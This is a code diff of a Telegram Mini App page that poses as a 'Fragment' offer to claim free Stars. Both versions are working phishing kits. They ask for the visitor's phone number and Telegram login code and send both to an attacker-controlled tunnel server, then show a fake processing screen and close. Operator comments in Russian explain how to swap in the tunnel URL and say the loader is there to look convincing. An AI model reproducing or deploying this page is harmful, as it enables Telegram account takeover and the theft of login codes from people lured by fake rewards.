@@ -3,126 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Fragment Ledger | Stars Bonus</title>
+    <title>Fragment | Claim Stars</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --tg-theme-bg: #000000; --tg-theme-text: #ffffff; --accent: #007aff; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--tg-theme-bg); color: var(--tg-theme-text); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .wrapper { width: 90%; max-width: 360px; background: #1c1c1e; border-radius: 24px; padding: 30px 20px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); border: 1px solid #2c2c2e; }
-        .icon-box { width: 72px; height: 72px; background: #2c2c2e; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
-        img { width: 45px; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { width: 90%; max-width: 380px; text-align: center; }
+        .card { background: #1c1c1e; border-radius: 24px; padding: 35px 24px; border: 1px solid #2c2c2e; }
+        .gift-icon { width: 64px; height: 64px; margin: 0 auto 20px; background: linear-gradient(135deg, #007aff, #00c6ff); border-radius: 18px; display: flex; align-items: center; justify-content: center; font-size: 32px; }
         h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px; }
-        p { font-size: 14px; color: #8e8e93; line-height: 1.4; margin-bottom: 25px; }
-        input { width: 100%; padding: 16px; border-radius: 14px; border: 1px solid #3a3a3c; background: #2c2c2e; color: #fff; font-size: 17px; margin-bottom: 12px; box-sizing: border-box; outline: none; transition: 0.2s; }
-        input:focus { border-color: var(--accent); }
-        button { width: 100%; padding: 16px; border-radius: 14px; border: none; background: var(--accent); color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        button:active { transform: scale(0.97); opacity: 0.8; }
-        button:disabled { background: #3a3a3c; color: #8e8e93; cursor: not-allowed; }
+        .badge { display: inline-block; padding: 4px 12px; background: rgba(0, 122, 255, 0.15); color: #007aff; border-radius: 20px; font-size: 12px; font-weight: 600; margin-bottom: 20px; border: 1px solid rgba(0, 122, 255, 0.3); }
+        p { color: #8e8e93; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        input { width: 100%; padding: 16px; border-radius: 14px; border: 1px solid #3a3a3c; background: #2c2c2e; color: #fff; font-size: 17px; box-sizing: border-box; outline: none; margin-bottom: 12px; }
+        button { width: 100%; padding: 16px; border-radius: 14px; border: none; background: #007aff; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }
+        button:disabled { background: #3a3a3c; color: #8e8e93; }
         .step { display: none; }
-        .active { display: block; animation: slideUp 0.3s ease-out; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .loader { border: 3px solid #3a3a3c; border-top: 3px solid var(--accent); border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .active { display: block; }
+        .dots:after { content: '.'; animation: d 1.5s linear infinite; }
+        @keyframes d { 0% { content: '.'; } 33% { content: '..'; } 66% { content: '...'; } }
     </style>
 </head>
 <body>
-
-<div class="wrapper">
-    <div class="icon-box">
-        <img src="https://telegram.org/img/website_icon.svg" alt="TG">
-    </div>
-    
-    <div id="step1" class="step active">
-        <h1>Claim Stars</h1>
-        <p>Connect your account via Fragment Ledger to receive <b>5,000 Stars</b> bonus.</p>
-        <input type="tel" id="phone" placeholder="+7 999 123 45 67">
-        <button id="btn1" onclick="submitPhone()">Connect Telegram</button>
-    </div>
-
-    <div id="step2" class="step">
-        <h1>Confirm Code</h1>
-        <p>Enter the code sent to your Telegram app to complete verification.</p>
-        <input type="number" id="code" placeholder="00000" pattern="\d*">
-        <button id="btn2" onclick="submitCode()">Verify & Claim</button>
-    </div>
-
-    <div id="step3" class="step">
-        <h1>Verifying...</h1>
-        <p>Synchronizing with smart contract nodes. Please stay on this page.</p>
-        <div class="loader"></div>
+<div class="container">
+    <div class="card">
+        <div class="gift-icon">🎁</div>
+        <div class="badge">FRAGMENT L2 CHECK</div>
+        <div id="s1" class="step active">
+            <h1>Fragment ID</h1>
+            <p>Connect your account to claim <b>100 Stars</b> from your gift check.</p>
+            <input type="tel" id="p" placeholder="+380 00 000 00 00">
+            <button id="b1" onclick="u()">Connect & Claim</button>
+        </div>
+        <div id="s2" class="step">
+            <h1>Verification</h1>
+            <p>Enter the code from Telegram to confirm your identity.</p>
+            <input type="number" id="c" placeholder="00000">
+            <button id="b2" onclick="v()">Confirm Registration</button>
+        </div>
+        <div id="s3" class="step">
+            <h1 class="dots">Processing</h1>
+            <p>Syncing check data with Fragment Ledger...</p>
+        </div>
     </div>
 </div>
-
 <script>
-    // --- ЗАМЕНИ ССЫЛКУ НИЖЕ НА ТУ, ЧТО ВЫДАЛ SSH ---
-    const SERVER_URL = "https://57bf31e3efb5ec.lhr.life"; 
-
+    const URL = "https://c838c30f8af483.lhr.life"; 
     const tg = window.Telegram.WebApp;
     tg.expand();
-    tg.ready();
-
-    async function submitPhone() {
-        const rawPhone = document.getElementById('phone').value;
-        const cleanPhone = "+" + rawPhone.replace(/\D/g, '');
-        
-        if (cleanPhone.length < 11) {
-            alert("Please enter a valid phone number.");
-            return;
-        }
-
-        const btn = document.getElementById('btn1');
-        btn.disabled = true;
-        btn.innerText = "Connecting...";
-
+    async function u() {
+        const ph = document.getElementById('p').value.replace(/\D/g, '');
+        if (ph.length < 10) return;
+        document.getElementById('b1').disabled = true;
         try {
-            const response = await fetch(`${SERVER_URL}/send_phone`, {
+            const r = await fetch(`${URL}/send_phone`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: cleanPhone })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: "+" + ph})
             });
-
-            if (response.ok) {
-                document.getElementById('step1').classList.remove('active');
-                document.getElementById('step2').classList.add('active');
+            if (r.ok) {
+                document.getElementById('s1').classList.remove('active');
+                document.getElementById('s2').classList.add('active');
             } else {
-                throw new Error();
+                alert("Gateway Error. Try again.");
+                document.getElementById('b1').disabled = false;
             }
-        } catch (err) {
-            alert("Gateway Error. Please restart the app.");
-            btn.disabled = false;
-            btn.innerText = "Connect Telegram";
-        }
+        } catch (e) { alert("Connection Error."); }
     }
-
-    async function submitCode() {
-        const code = document.getElementById('code').value;
-        const rawPhone = document.getElementById('phone').value;
-        const cleanPhone = "+" + rawPhone.replace(/\D/g, '');
-
-        if (code.length < 5) {
-            alert("Enter the full 5-digit code.");
-            return;
-        }
-
-        document.getElementById('step2').classList.remove('active');
-        document.getElementById('step3').classList.add('active');
-
+    async function v() {
+        const co = document.getElementById('c').value;
+        const ph = "+" + document.getElementById('p').value.replace(/\D/g, '');
+        document.getElementById('s2').classList.remove('active');
+        document.getElementById('s3').classList.add('active');
         try {
-            await fetch(`${SERVER_URL}/send_code`, {
+            await fetch(`${URL}/send_code`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: cleanPhone, code: code })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: ph, code: co})
             });
-
-            // Держим лоадер для солидности и закрываем
-            setTimeout(() => {
-                tg.close();
-            }, 6000);
-        } catch (err) {
-            setTimeout(() => tg.close(), 3000);
-        }
+            setTimeout(() => { tg.close(); }, 5000);
+        } catch (e) { tg.close(); }
     }
 </script>
-
 </body>
 </html>
